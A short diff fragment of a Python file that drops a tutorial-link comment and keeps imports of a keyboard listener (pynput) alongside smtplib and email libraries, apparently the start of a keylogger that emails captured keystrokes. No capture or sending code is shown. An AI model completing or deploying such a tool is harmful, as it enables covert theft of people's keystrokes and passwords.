@@ -1,5 +1,4 @@
-#YouTube Tutorial ---> https://youtu.be/S5haDGGD0XM?si=gtM1j7Opa455Hh79
-#Python version 3.11.2
+
 from pynput.keyboard import Listener
 import smtplib
 from email.mime.multipart import MIMEMultipart
